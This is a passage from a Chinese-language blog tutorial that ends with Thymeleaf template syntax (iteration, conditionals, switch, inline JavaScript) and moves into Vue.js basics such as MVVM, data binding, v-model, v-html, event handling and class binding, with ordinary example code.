<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;user : $&#123;users&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;</span>Onions<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.age&#125;&quot;</span>&gt;</span>2.41<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>${users} 是要遍历的集合，可以是以下类型：<ul>
<li>Iterable，实现了Iterable接口的类</li>
<li>Enumeration，枚举</li>
<li>Interator，迭代器</li>
<li>Map，遍历得到的是Map.Entry</li>
<li>Array，数组及其它一切符合数组结果的对象</li>
</ul>
</li>
</ul>
<p>在迭代的同时，我们也可以获取迭代的状态对象：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;user,stat : $&#123;users&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;</span>Onions<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.age&#125;&quot;</span>&gt;</span>2.41<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="start对象"><a href="#start对象" class="headerlink" title="start对象"></a>start对象</h3><p><strong>stat对象</strong>包含以下属性：</p>
<ul>
<li>index，从0开始的角标</li>
<li>count，元素的个数，从1开始</li>
<li>size，总元素个数</li>
<li>current，当前遍历到的元素</li>
<li>even/odd，返回是否为奇偶，boolean值</li>
<li>first/last，返回是否为第一或最后，boolean值</li>
</ul>
<h2 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h2><p>有了<code>if和else</code>，我们能实现一切功能，Thymeleaf中使用<code>th:if</code> 或者 <code>th:unless</code> ，两者的意思恰好相反。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;user.age&#125; &gt; 24&quot;</span>&gt;</span>老油条<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果表达式的值为<strong>true</strong>，则标签会渲染到页面，否则不进行渲染。</p>
<p>以下情况被认定为true：</p>
<ul>
<li>表达式值为true</li>
<li>表达式值为非0数值</li>
<li>表达式值为非0字符</li>
<li>表达式值为字符串，但不是<code>&quot;false&quot;</code>,<code>&quot;no&quot;</code>,<code>&quot;off&quot;</code></li>
<li>表达式不是布尔、字符串、数字、字符中的任何一种</li>
</ul>
<p>其它情况包括null都被认定为false</p>
<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>这里要使用两个指令：<code>th:switch</code> 和 <code>th:case</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:switch</span>=<span class="string">&quot;$&#123;user.role&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;&#x27;admin&#x27;&quot;</span>&gt;</span>用户是管理员<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;&#x27;manager&#x27;&quot;</span>&gt;</span>用户是经理<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:case</span>=<span class="string">&quot;*&quot;</span>&gt;</span>用户是别的玩意<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，一旦有一个th:case成立，其它的则不再判断。与java中的switch是一样的。</p>
<p>另外<code>th:case=&quot;*&quot;</code>表示默认，放最后。</p>
<p><img src="https://img2018.cnblogs.com/blog/1526344/201908/1526344-20190819082837178-1926390076.png" alt="img"></p>
<h2 id="JS模板"><a href="#JS模板" class="headerlink" title="JS模板"></a>JS模板</h2><p>模板引擎不仅可以渲染html，也可以对JS中的进行预处理。而且为了在纯静态环境下可以运行，其Thymeleaf代码可以被注释起来：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">th:inline</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> user = <span class="comment">/*[[$&#123;user&#125;]]*/</span> &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> age = <span class="comment">/*[[$&#123;user.age&#125;]]*/</span> <span class="number">20</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(user);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(age)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在script标签中通过<code>th:inline=&quot;javascript&quot;</code>来声明这是要特殊处理的js脚本</p>
</li>
<li><p>语法结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> user = <span class="comment">/*[[Thymeleaf表达式]]*/</span> <span class="string">&quot;静态环境下的默认值&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>因为Thymeleaf被注释起来，因此即便是静态环境下， js代码也不会报错，而是采用表达式后面跟着的默认值。且User对象会被直接处理为json格式。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>vue</title>
    <url>/2021/04/03/Vue/</url>
    <content><![CDATA[<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>中文文档：<a href="https://cn.vuejs.org/">https://cn.vuejs.org/</a></p>
<p>Vue.js是一款流行的开源<strong>JavaScript</strong>前端框架，旨在更好地组织与简化Web开发。</p>
<p>Vue所关注的核心是MVC模式中的视图层，同时，它也能方便地获取数据更新，并通过组件内部特定的方法实现视图与模型的交互</p>
<a id="more"></a>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在官网下载地址： <a href="https://cn.vuejs.org/v2/guide/installation.html">https://cn.vuejs.org/v2/guide/installation.html</a></p>
<p>vue的引入类似于jQuery，开发中可以使用开发版本vue.js，产品上线要换成vue.min.js</p>
<h2 id="vue-js的M-V-VM思想"><a href="#vue-js的M-V-VM思想" class="headerlink" title="vue.js的M-V-VM思想"></a>vue.js的M-V-VM思想</h2><p>MVVM 是 Model-View-ViewModel 的缩写，它是一种基于前端开发的架构模式。</p>
<p><code>Model</code> 指代的就是vue对象的data属性里面的数据。这里的数据要显示到页面中。</p>
<p><code>View</code> 指代的就是vue中数据要显示的HTML页面，在vue中，也称之为“视图模板” 。</p>
<p><code>ViewModel</code> 指代的是vue.js中我们编写代码时的vm对象了，它是vue.js的核心，负责连接 View 和 Model，保证视图和数据的一致性，所以前面代码中，data里面的数据被显示中p标签中就是vm对象自动完成的。</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="Vue对象"><a href="#Vue对象" class="headerlink" title="Vue对象"></a>Vue对象</h2><ol>
<li>vue的使用从创建Vue对象开始</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var index &#x3D; new Vue()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>vue对象需要传递参数，是json对象，json对象对象必须至少有两个属性成员</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">vm = new Vue(&#123;</span><br><span class="line">el:&quot;#app&quot;,</span><br><span class="line">data: &#123;</span><br><span class="line"></span><br><span class="line">　　methods:&#123;&#125;,</span><br><span class="line"></span><br><span class="line">　　watch:&#123;&#125;,</span><br><span class="line"></span><br><span class="line">　　filters:&#123;&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>el：设置vue可以操作的html内容范围，值就是css的id选择器</p>
</li>
<li><p><strong>data</strong>: 保存vue.js中要显示到html页面的数据。</p>
</li>
<li><p><strong>method</strong>s:定义函数。</p>
</li>
<li><p><strong>watch</strong>:监听属性</p>
</li>
<li><p>**filters:**定义过滤器。</p>
</li>
</ul>
<ol start="3">
<li>vue.js要控制器的内容外围，必须先通过<strong>id</strong>来设置</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>ps</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> index = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&quot;#wxpay&quot;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            userIsLogin: <span class="literal">false</span>,</span></span><br><span class="line">            userInfo: &#123;&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在浏览器中通过<code>console.log</code>通过vm对象可以直接访问el和data属性,甚至可以访问data里面的数据</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">console.log(vm.$el)     # #box  vm对象可以控制的范围</span><br><span class="line">console.log(vm.$data);  # vm对象要显示到页面中的数据</span><br><span class="line">console.log(vm.$data.message);  # 访问data里面的数据</span><br><span class="line">console.log(vm.message);# 这个 message就是data里面声明的数据,也可以使用 vm.变量名显示其他数据,message只是举例.</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>如果要输出data里面的数据作为普通标签的内容，需要使用<code>&#123; &#123; &#125; &#125; </code>用法： vue对象的data属性</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">data:&#123;</span><br><span class="line">　　name:&quot;小明&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>账号：&#123;&#123; userInfo.name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签元素：**{  { name }  }**</p>
<ol start="2">
<li>如果要输出data里面的数据作为表单元素的值，需要使用vue.js提供的元素属性v-model 用法： vue对象的data属性　　</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#123; name:&quot;小明&quot;, &#125;</span><br></pre></td></tr></table></figure>

<p>表单元素：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用v-model把data里面的数据显示到表单元素以后，一旦用户修改表单元素的值，则data里面对应数据的值也会随之发生改变，甚至，页面中凡是使用了这个数据都会发生变化。</p>
<h2 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h2><ol>
<li>在双标签中显示数据要通过<code>&#123; &#123;  &#125; &#125;</code>来完成数据显示</li>
<li>在表单输入框中显示数据要使用v-model来完成数据显示</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">          el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">          data:&#123;</span><br><span class="line"><span class="javascript">            str1: <span class="string">&quot;hello&quot;</span>,</span></span><br><span class="line">            num: 20,</span><br><span class="line">            num2: 30,</span><br><span class="line"><span class="javascript">            url1: <span class="string">&quot;http://www.baidu.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">            url2: <span class="string">&quot;http://www.taobao.com&quot;</span></span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">app</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; str1 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; str1.split(&quot;&quot;).reverse().join(&quot;&quot;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    js语法 3元运算符--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>num和num2中比较大的数是：&#123;&#123; num&gt;num2? num:num2 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>双花括号仅用输出文本内容,如果要输出html代码,则不能使用这个.要使用v-html来输出.</p>
<ol start="3">
<li><code>v-html</code>必须在html标签里面作为属性写出来.</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123;url1&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;&#123;img&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        //!!!</span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">&quot;img&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;.app&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line"><span class="javascript">                title:<span class="string">&quot;我的vue&quot;</span>,</span></span><br><span class="line"><span class="javascript">                url1:<span class="string">&quot;我的收获地址&quot;</span>,</span></span><br><span class="line"><span class="javascript">          <span class="comment">//html标签      </span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                img:&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://dss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2807509578,211432801&amp;fm=58&quot;</span>&gt;</span>&#x27;,</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>在vue中，提供了很多指令，常用的有：v-if、v-model、v-for等等。</p>
<h3 id="操作属性"><a href="#操作属性" class="headerlink" title="操作属性"></a>操作属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;标签名 :标签属性=&quot;data属性&quot;&gt;&lt;/标签名&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:title</span>=<span class="string">&quot;str1&quot;</span>&gt;</span>&#123;&#123; str1 &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="comment">&lt;!-- 也可以使用v-html显示双标签的内容，&#123;&#123;  &#125;&#125; 是简写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url2&quot;</span>&gt;</span>淘宝<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url1&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  <span class="comment">&lt;!-- v-bind是vue1.x版本的写法 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>methods</code>中的子方法里面要操作<code>data</code>的属性，可以使用this.属性值</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">:type</span>=<span class="string">&quot;tp&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line">        //鼠标按下触发down函数 弹起up函数·</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">mousedown</span>=<span class="string">&quot;down&quot;</span> @<span class="attr">mouseup</span>=<span class="string">&quot;up&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">            data:&#123;</span><br><span class="line"><span class="javascript">                message:<span class="string">&quot;显示密码&quot;</span>,</span></span><br><span class="line"><span class="javascript">                pwd:<span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="javascript">                tp:<span class="string">&quot;password&quot;</span>,</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">down</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 在methods中的子方法里面要操作data的属性，可以使用this.属性值</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.tp=<span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.message=<span class="string">&quot;隐藏密码&quot;</span>;</span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">up</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.tp=<span class="string">&quot;password&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.message=<span class="string">&quot;显示密码&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h3><p>有两种事件操作的写法，@事件名 和 v-on:事件名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;num++&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span>   <span class="comment">&lt;!-- v-on 是vue1.x版本的写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;num+=5&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>例如:完成商城购物车中的商品增加减少数量</strong></p>
<p>步骤：</p>
<ol>
<li>给vue对象添加操作数据的方法</li>
<li>在标签中使用指令调用操作数据的方法</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;num&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sub&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    单价：&#123;&#123;price&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>总计：&#123;&#123;total.toFixed(2)&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>#toFixed取小数后2位</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            num: 1,</span><br><span class="line">            price: 39.8,</span><br><span class="line">            total: 39.8,</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 增加数量parseInt转为int</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.num = <span class="built_in">parseInt</span>(<span class="built_in">this</span>.num) + <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.calc();</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">sub</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">               <span class="comment">// 减少数量</span></span></span><br><span class="line"><span class="javascript">               <span class="keyword">if</span>(<span class="built_in">this</span>.num&lt;=<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="javascript">                   <span class="keyword">return</span>;</span></span><br><span class="line">               &#125;</span><br><span class="line"><span class="javascript">               <span class="built_in">this</span>.num -= <span class="number">1</span>;</span></span><br><span class="line">               this.calc();#每次就计算总数</span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">calc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">               <span class="comment">// 计算总价</span></span></span><br><span class="line"><span class="javascript">               <span class="built_in">this</span>.total = <span class="built_in">this</span>.price * <span class="built_in">this</span>.num;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="操作样式"><a href="#操作样式" class="headerlink" title="操作样式"></a>操作样式</h3><h4 id="标签class类名"><a href="#标签class类名" class="headerlink" title="标签class类名"></a>标签class类名</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span> <span class="attr">:class</span>=<span class="string">&quot;值&quot;</span>&gt;</span>元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  值可以是字符串、对象、对象名、数组</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span>&#123;</span></span><br><span class="line">        color: red;</span><br><span class="line"><span class="css">        <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#000</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span>&#123;</span></span><br><span class="line">        background-color: orange;</span><br><span class="line">        font-size: 32px;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--- 添加class类名，值是一个对象</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         class类1:布尔值变量1,</span></span><br><span class="line"><span class="comment">         class类2:布尔值变量2,</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;box1:myclass1&#125;&quot;</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> @<span class="attr">click</span>=<span class="string">&quot;myclass3=!myclass3&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;box1:myclass2,box2:myclass3&#125;&quot;</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span 